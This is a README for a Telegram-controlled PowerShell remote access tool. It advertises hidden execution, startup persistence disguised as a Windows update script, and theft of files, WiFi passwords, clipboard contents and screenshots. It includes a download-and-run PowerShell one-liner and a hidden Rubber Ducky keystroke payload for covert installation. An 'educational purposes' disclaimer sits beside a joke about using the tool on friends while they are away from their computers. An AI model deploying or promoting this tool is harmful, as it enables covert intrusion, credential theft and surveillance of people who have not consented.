## ⚠️ DISCLAIMER

> [!WARNING]
> **This script is for educational purposes only. Do NOT use it on systems you do not own or have explicit permission to test. Misuse may be illegal and can have serious consequences.**

# Telegram-Controlled PowerShell Script

**Get persistent remote control access through Telegram commands.**
Don't use it when your friends are away from their computer 🤫
This script allows you to control a Windows system remotely through Telegram, offering various functionalities like taking screenshots, sending files, recording audio/video, locking or restarting the system, and more.

## 🛠 Prerequisites

* Windows 10 or newer
* PowerShell 5 or later (built-in)
* Internet connection
* A Telegram bot token (from [@BotFather](https://t.me/BotFather))
* Your own Telegram user ID (use [@userinfobot](https://t.me/userinfobot))

### 📥 How to Create a Telegram Bot

1. Open Telegram and search for `@BotFather`.
2. Start a conversation and type `/newbot` to create a new bot.
3. Follow the instructions to set a name and username for your bot.
4. After completion, you will receive a **bot token** which you'll use in the script.

## 🔒 Enable Script Execution

Before running the script, allow PowerShell to execute local scripts:

### Powershell (Permanent fix)

```powershell
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
```

### Powershell (One-time fix for your session)

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```

### Powershell pipeline

```powershell
iwr 'https://example.com/urfile.ps1' -UseBasicParsing -OutFile $env:TEMP\prankware.ps1; powershell -ep bypass -File $env:TEMP\prankware.ps1
```

### Hidden PowerShell Ducky Script EXAMPLE
```txt
GUI r
DELAY 300
STRING powershell -WindowStyle Hidden -ep bypass -Command iwr 'https://example.com/urfile.ps1' -UseBasicParsing -OutFile $env:TEMP/update.ps1; powershell -ep bypass -File $env:TEMP/update.ps1
ENTER
```
---

## 📌 Available Commands

### 🔧 System Control
* `/help` → Displays all available commands
* `/pcname` → Shows the computer name
* `/ip` → Shows local and public IP addresses
* `/lock` → Locks the workstation
* `/restart` → Restarts the computer (requires confirmation)
* `/shutdown` → Shuts down the computer (requires confirmation)
* `/notepad` → Opens Notepad
* `/visit <url>` → Opens a URL in the default browser
* `/sysinfo` → Displays detailed system information (CPU, RAM, OS, disk)
* `/screenshot` → Takes a screenshot and sends it to chat

### 📁 File Operations
* `/getfile <path>` → Send a file from local disk
* `/getfolder <path>` → Send a zipped folder from local disk
* `/delete <path>` → Delete a file or folder
* `/rename <old> <new>` → Rename or move a file or folder

### 🗂️ File System Navigation
* `cd <path>` → Change directory
* `cd` → Show current directory
* `ls` or `dir` → List files and folders in current directory

### 📊 Monitoring & Process Control
* `/processes` → List top 20 running processes by CPU usage
* `/kill <pid>` → Terminate a process by PID
* `/tasklist` → Display top 25 processes by memory usage
* `/taskkill <name>` → Kill all processes by name
* `/services` → List running Windows services

### 📋 Clipboard & WiFi
* `/getclipboard` → Gets clipboard history (appends current clipboard and returns log)
* `/clearclipboard` → Clears stored clipboard history file
* `/setclipboard <text>` → Sets text to clipboard
* `/wifi` → Shows all saved WiFi networks and passwords

### 💻 Command Execution
* `/cmd <command>` → Execute CMD command
* `/powershell <command>` → Execute PowerShell command

### 🔄 Maintenance
* `/update <url>` → Updates the script from a URL and restarts the system
* `/selfdestruct` → Removes all traces of the script and terminates (requires confirmation)

---

## ✨ Features

### 🔄 Automatic Features
- **Persistence:** Automatically sets up startup persistence via VBS launcher
- **Network Monitoring:** Detects when the PC goes online and sends a notification
- **Resume Detection:** Sends a message when the system resumes from sleep
- **Hidden Execution:** Runs completely hidden with no visible windows
- **Startup Command Filtering:** Skips old/pending Telegram commands on startup

### 🛡️ Reliability Features
- **Network Resilience:** Automatically waits for network connectivity and reconnects
- **Error Handling:** Robust error handling for all operations
- **Path Flexibility:** Supports relative and absolute paths
- **Drive Navigation:** Properly handles drive-only paths (C:, D:, etc.)
- **UNC Path Support:** Can navigate to network/UNC paths

### 📝 Command Features
- **Confirmation Required:** Sensitive commands like restart, shutdown, and selfdestruct require confirmation
- **Current Directory Tracking:** Maintains current directory across sessions
- **Clipboard History:** Tracks clipboard changes with timestamps
- **File Size Limits:** Handles large files appropriately
- **Process Information:** Detailed process and service information

---

## 🔐 Security Notes

> [!CAUTION]
> - This script provides full system access to anyone with your bot token
> - Keep your bot token and user ID private
> - The script retrieves and can send sensitive information (WiFi passwords, files, clipboard content)
> - Uses hidden execution to avoid detection
> - Sets up automatic startup persistence

### Removal

To completely remove the script:
1. Send `/selfdestruct` command to your bot
2. Send `/confirm-selfdestruct` to confirm
3. This will remove:
   - The startup VBS launcher
   - The hidden script copy
   - The running script itself

Alternatively, manually delete:
- `%APPDATA%\Microsoft\Windows\prankware.ps1` (or your script name)
- `%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdateScheduler.vbs`

---

## 📝 Notes

- The script runs completely hidden with no visible windows
- Maintains connection even after sleep/hibernate
- Automatically skips old commands on startup to prevent accidental execution
- All file paths can be relative (to current directory) or absolute
- Maximum message length is 4000 characters (longer output will be truncated)
- Screenshot functionality captures the entire virtual screen (multi-monitor support)

---

## 🤝 Contributing

Feel free to submit issues or pull requests to improve this project!

## 📄 License

This project is provided as-is for educational purposes only. Use responsibly and ethically.


